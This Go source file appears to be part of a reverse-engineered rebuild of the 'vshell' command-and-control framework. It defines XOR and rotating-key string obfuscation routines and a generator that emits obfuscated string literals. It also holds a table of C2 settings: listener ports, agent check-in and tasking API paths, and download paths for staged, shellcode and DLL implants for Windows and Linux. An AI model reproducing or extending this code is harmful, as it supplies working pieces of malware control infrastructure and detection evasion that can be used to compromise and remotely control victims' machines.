package c2engine

import (
	"encoding/hex"
	"fmt"
	"strings"
)

// ============================================================================
// String Obfuscation (equivalent to decFunc in every package)
// 字符串混淆（对应每个包中的 decFunc）
// ============================================================================
//
// The original binary uses a per-package decFunc type that decodes
// 原版二进制在每个包中使用 decFunc 类型的解码函数，
// obfuscated string literals. Each encoded string is stored as:
//   struct { data *[]uint8; seed *uint8; fnc *decFunc }
//
// The standard encoding is XOR with a single seed byte.

// DecFunc 是字符串解码函数的类型。
// DecFunc is the type of the string decode function.
type DecFunc func(data []byte, seed byte) string

// ObfuscatedString 表示一个编码后的字符串字面量。
// ObfuscatedString represents an encoded string literal.
type ObfuscatedString struct {
	Data []byte
	Seed byte
}

// String 解码并返回明文。
// String decodes and returns the plaintext.
func (os ObfuscatedString) String() string {
	return DefaultDecode(os.Data, os.Seed)
}

// DefaultDecode 使用种子字节解码 XOR 混淆字符串。
// DefaultDecode decodes an XOR-obfuscated string with a seed byte.
func DefaultDecode(data []byte, seed byte) string {
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ seed
	}
	return string(result)
}

// NewObfuscatedString 创建混淆字符串。
// NewObfuscatedString creates an obfuscated string.
func NewObfuscatedString(plaintext string, seed byte) ObfuscatedString {
	data := make([]byte, len(plaintext))
	for i := 0; i < len(plaintext); i++ {
		data[i] = plaintext[i] ^ seed
	}
	return ObfuscatedString{Data: data, Seed: seed}
}

// EncodeString 生成字符串的混淆表示。
// EncodeString creates an obfuscated representation of a string.
func EncodeString(plaintext string, seed byte) []byte {
	data := make([]byte, len(plaintext))
	for i := 0; i < len(plaintext); i++ {
		data[i] = plaintext[i] ^ seed
	}
	return data
}

// DecodeString 解码 XOR 混淆的字节切片。
// DecodeString decodes an XOR-obfuscated byte slice.
func DecodeString(data []byte, seed byte) string {
	return DefaultDecode(data, seed)
}

// ============================================================================
// 5-Character Encoding Scheme (reverse-engineered)
// ============================================================================
//
// 原版 vshell 对特定字符串使用自定义 5 字符编码，用 5 字节密钥循环作用于数据。
// The original vshell uses a custom 5-character encoding for certain strings.
// This encoding uses a 5-byte key repeated over the data.

// FiveCharDecode 使用 5 字符密钥方案解码字符串。
// FiveCharDecode decodes strings using the 5-character key scheme.
func FiveCharDecode(data []byte, key [5]byte) string {
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key[i%5]
	}
	return string(result)
}

// FiveCharEncode 使用 5 字符密钥方案编码字符串。
// FiveCharEncode encodes a string using the 5-character key scheme.
func FiveCharEncode(plaintext string, key [5]byte) []byte {
	data := make([]byte, len(plaintext))
	for i := 0; i < len(plaintext); i++ {
		data[i] = plaintext[i] ^ key[i%5]
	}
	return data
}

// ============================================================================
// Hex encoding helpers (for display/storage)
// ============================================================================

// HexEncode 将字节编码为十六进制字符串。
// HexEncode encodes bytes to hex string.
func HexEncode(data []byte) string {
	return hex.EncodeToString(data)
}

// HexDecode 将十六进制字符串解码为字节。
// HexDecode decodes hex string to bytes.
func HexDecode(s string) ([]byte, error) {
	return hex.DecodeString(s)
}

// ============================================================================
// Obfuscated string table - mirrors the binary's obfuscated string storage
// ============================================================================

// StringTable holds decoded strings for the application
type StringTable struct {
	entries map[string]string
}

// NewStringTable creates a string table with default entries
func NewStringTable() *StringTable {
	st := &StringTable{entries: make(map[string]string)}

	// Common C2 framework strings (would be obfuscated in the binary)
	st.entries["app_name"] = "VShell"
	st.entries["app_title"] = "管理平台" // 管理平台 (Management Platform)
	st.entries["default_listen_addr"] = "0.0.0.0:443"
	st.entries["default_web_addr"] = "0.0.0.0:8082"
	st.entries["default_username"] = "admin"
	st.entries["default_password"] = "" // no hardcoded default — generated at startup

	// C2 protocol strings
	st.entries["checkin_path"] = "/api/checkin"
	st.entries["task_path"] = "/api/tasks"
	st.entries["result_path"] = "/api/result"
	st.entries["upload_path"] = "/api/upload"
	st.entries["download_path"] = "/api/download"

	// Agent download paths
	st.entries["agent_win_stage"] = "/swt"     // TCP staged agent for Windows
	st.entries["agent_win_stageless"] = "/sww"  // WebSocket agent for Windows
	st.entries["agent_win_kcp"] = "/swk"        // KCP agent for Windows
	st.entries["agent_win_shellcode"] = "/sws"  // Shellcode agent for Windows
	st.entries["agent_win_dll"] = "/swd"        // DLL agent for Windows
	st.entries["agent_linux_stageless"] = "/swl" // Linux agent

	// Cookie/session
	st.entries["session_name"] = "vshell-session"
	st.entries["cookie_token"] = "token"
	st.entries["cookie_xsrf"] = "_xsrf"

	// Database
	st.entries["db_driver"] = "sqlite3"
	st.entries["db_path"] = "db/data.db"

	return st
}

// Get returns a string from the table
func (st *StringTable) Get(key string) string {
	return st.entries[key]
}

// Set adds or updates a string in the table
func (st *StringTable) Set(key, value string) {
	st.entries[key] = value
}

// ============================================================================
// Obfuscation utility for generating encoded strings
// ============================================================================

// GenObfuscated generates Go source code for an obfuscated string literal
func GenObfuscated(plaintext string, seed byte) string {
	encoded := EncodeString(plaintext, seed)
	hexStr := fmt.Sprintf("%#v", encoded)
	return fmt.Sprintf(`ObfuscatedString{Data: %s, Seed: %d}`, hexStr, seed)
}

// PrintAllObfuscated prints all strings from the table in obfuscated form
func (st *StringTable) PrintAllObfuscated(seed byte) string {
	var sb strings.Builder
	sb.WriteString("// Obfuscated string table (seed=")
	sb.WriteString(fmt.Sprintf("%d", seed))
	sb.WriteString(")\n")
	for k, v := range st.entries {
		sb.WriteString(fmt.Sprintf("// %s: %s\n", k, GenObfuscated(v, seed)))
	}
	return sb.String()
}
